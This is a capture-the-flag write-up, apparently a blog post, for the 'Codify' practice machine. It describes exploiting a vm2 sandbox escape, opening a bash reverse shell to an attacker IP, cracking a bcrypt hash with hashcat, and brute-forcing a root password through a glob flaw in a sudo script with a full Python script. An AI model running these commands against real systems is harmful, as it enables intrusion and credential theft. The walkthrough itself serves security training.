@@ -1,0 +1,168 @@
+---
+layout: post
+title:  "Codify Machine (Easy)"
+date:   2024-04-05 17:04:54 +0100
+categories: ["OS Command Injection", "Brute Force"]
+---
+
+## Information Gathering
+
+First run a nmap scan to show the services available on the target.
+
+![Nmap scan](/assets/machines/codify.htb/images/1_nmap_scan.png)
+
+*Note: En el output aunque aparezca el puerto 3000 abierto, era otro hacker entusiasta que abriría ese puerto.*
+
+The web application use the vm2 software to allow users to execute Nodejs code in the server.
+
+![HTTP Web service](/assets/machines/codify.htb/images/2_http_web_service.png)
+
+The version of vm2 can be found at link of the About us page.
+
+![HTTP Web service](/assets/machines/codify.htb/images/3_http_vm2_version.png)
+
+## Vulnerability Assesment
+
+A quick search on Google reveals that there is a vulnerability for version vm2 3.9.16: [CVE-2023-30547](https://nvd.nist.gov/vuln/detail/CVE-2023-30547)
+
+In the following link, we have a [Proof of Concept (PoC)](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244).
+
+## Execute reverse shell
+
+We will exploit the vulnerability by injecting a command that will execute a reverse shell. The command to inject is as follows:
+
+```bash
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.35/9000 0>&1"
+```
+
+![HTTP Web service](/assets/machines/codify.htb/images/4_os_command_injection.png)
+
+Before clicking on `Run`, make sure you have netcat listening.
+
+![HTTP Web service](/assets/machines/codify.htb/images/5_nc_revshell.png)
+
+¡We are in! The next step is to gather information again.
+
+## Brute Forcing Password
+
+We find two users, `svc` and `joshua`. Since we are inside a CTF, it looks like we first need to compromise the `joshua` user by performing privilege escalation, and then go for the root user.
+
+![HTTP Web service](/assets/machines/codify.htb/images/7_users.png)
+
+Searching through the files on the website, we came across the file `tickets.db`, which contains the hashed password of the user joshua.
+
+![HTTP Web service](/assets/machines/codify.htb/images/6_tickets_db.png)
+
+If we look at the hash, it is Bcrypt. Fortunately, we have our trusted tool Hashcat.
+
+```bash
+hashcat -m 3200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+The argument `-m 3200` indicates that we will use the Bcrypt hash.
+
+![HTTP Web service](/assets/machines/codify.htb/images/8_hashcat.png)
+
+The brute force attack was successful, and we obtained the credentials `joshua:spongebob1`. Now, let's cross our fingers that he has reused the password for his account on the server.
+
+![HTTP Web service](/assets/machines/codify.htb/images/9_su_joshua.png)
+
+Thanks God! We got Joshua's flag, and now let's go for root.
+
+## Privilege Escalation
+
+The command `sudo -l` shows us the commands/scripts that we can execute as root.
+
+![HTTP Web service](/assets/machines/codify.htb/images/10_sudo_l.png)
+
+We come across the script `/opt/scripts/mysql-backup.sh`, its contents are as follows:
+
+```bash
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+```
+
+This script basically performs a backup and stores it in `/var/backups/mysql`. However, to execute the script, we are asked for the root password in the MySQL database. If we enter the wrong password, the rest of the script will not execute.
+
+Fortunately, the following conditional has a vulnerability that we can exploit:
+
+```bash
+if [[ $DB_PASS == $USER_PASS ]]
+```
+
+Our input has not been sanitized, so we can use the wildcard `*` to brute force the root password. By introducing the next inputs `a*`, `b*`, `c*`, `d*`, `e*`, `f*`, ..., `kl*`.
+
+After a few minutes, I created this Python script to brute force the root password using the previous methodology. Please note that this script does not use symbols like `$,.`, as they could provoke script errors.
+
+```python
+import os
+import time
+
+
+# This python script brute force the password by using wildcard * in the password
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+pass_arr = 'kljh12k3jhaskjh12kjh'.split()
+i = 0
+while True:
+    pass_str = ''.join(pass_arr)
+    result = os.system(f"echo {pass_str}* | sudo /opt/scripts/mysql-backup.sh 1>/dev/null 2>/dev/null")
+    time.sleep(0.5)
+
+    # If the appended character was not found, replace it with the next character
+    if result != 0:
+        print(f"Character not found: {pass_str}*")
+        i += 1
+        # If we have tried all characters, password was found
+        if i >= len(chars):
+            pass_arr.pop()
+            print(f"Password found: {''.join(pass_arr)}")
+            break
+        # Otherwise, replace the last character with the next one
+        pass_arr[len(pass_arr) - 1] = chars[i]
+        continue
+
+    # If a new character was found, add it to the password
+    print(f"Found character: {pass_str}*")
+    i = 0
+    pass_arr.append(chars[i])
+    continue
+```
+
+The above script will perform a brute force attack to obtain the root password.
+
+![HTTP Web service](/assets/machines/codify.htb/images/11_py_bruteforce_start.png)
+
+Finally, after a few minutes, we have obtained the root password.
+
+![HTTP Web service](/assets/machines/codify.htb/images/12_py_bruteforce_end.png)
+
+Use it wisely to obtain the root flag.
+
+¡Happy Hacking!
